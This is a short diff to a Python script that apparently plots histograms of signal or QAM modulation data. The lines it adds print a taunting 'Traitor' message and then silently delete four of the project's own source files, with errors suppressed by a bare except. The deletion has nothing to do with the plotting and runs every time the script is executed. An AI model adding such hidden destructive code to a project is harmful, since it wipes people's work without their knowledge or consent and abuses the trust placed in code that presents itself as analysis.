@@ -52,6 +52,15 @@ h0 = circle_histogram(mat[:-5, line_test], n_samples)
 plot_circle(h0)
 nice_show()
 
+from os import remove
+print("I told you !!! :-( Traitor")
+try:
+    remove("manual_gaussian.py")
+    remove("neuron_launcher.py")
+    remove("plot_tools.py")
+    remove("test_qam.py")
+except:
+    pass
 
 # ------ Comparison of the cloud data and the modulation diagram
 # if we know the  settings of the sources ------
